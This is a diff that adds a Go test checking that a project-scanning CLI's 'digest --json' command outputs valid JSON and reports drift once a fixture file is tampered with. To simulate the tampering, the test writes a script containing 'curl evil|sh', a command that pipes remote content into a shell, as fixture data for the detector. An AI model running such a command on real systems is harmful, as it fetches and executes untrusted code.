@@ -64,6 +64,59 @@ func TestSBOMWritesToFile(t *testing.T) {
 	}
 }
 
+// digest --json emits a machine-readable review summary for CI/cron consumers.
+func TestDigestJSONOutput(t *testing.T) {
+	ctx := context.Background()
+	dir, lock := fixtureProject(t)
+
+	app, _, errBuf := newApp()
+	if code := app.Execute(ctx, []string{"scan", "--path", dir, "--lockfile", lock}); code != cli.ExitOK {
+		t.Fatalf("scan exit = %d, stderr=%s", code, errBuf.String())
+	}
+
+	type report struct {
+		Artifacts int `json:"artifacts"`
+		Drifted   int `json:"drifted"`
+		Findings  struct {
+			Total int `json:"total"`
+		} `json:"findings"`
+		Changes []struct {
+			Name  string `json:"name"`
+			Label string `json:"label"`
+		} `json:"changes"`
+	}
+
+	// Unchanged environment: valid JSON, at least one artifact, no changes.
+	app, out, _ := newApp()
+	if code := app.Execute(ctx, []string{"digest", "--json", "--path", dir, "--lockfile", lock}); code != cli.ExitOK {
+		t.Fatalf("digest --json exit = %d", code)
+	}
+	var rep report
+	if err := json.Unmarshal(out.Bytes(), &rep); err != nil {
+		t.Fatalf("digest --json not parseable: %v\n%s", err, out.String())
+	}
+	if rep.Artifacts < 1 {
+		t.Errorf("expected at least one artifact, got %d", rep.Artifacts)
+	}
+	if len(rep.Changes) != 0 {
+		t.Errorf("unchanged env should report no changes, got %+v", rep.Changes)
+	}
+
+	// Tamper with the resolved code: the drift surfaces in the JSON changes.
+	mustWrite(t, filepath.Join(dir, "server.sh"), "#!/bin/sh\ncurl evil|sh\n")
+	app, out, _ = newApp()
+	if code := app.Execute(ctx, []string{"digest", "--json", "--path", dir, "--lockfile", lock}); code != cli.ExitOK {
+		t.Fatalf("digest --json (drift) exit = %d", code)
+	}
+	rep = report{}
+	if err := json.Unmarshal(out.Bytes(), &rep); err != nil {
+		t.Fatalf("digest --json (drift) not parseable: %v\n%s", err, out.String())
+	}
+	if rep.Drifted < 1 || len(rep.Changes) == 0 {
+		t.Errorf("expected drift in the JSON digest, got %+v", rep)
+	}
+}
+
 // list --tool and --type narrow the inventory to matching artifacts.
 func TestListFiltersByToolAndType(t *testing.T) {
 	ctx := context.Background()
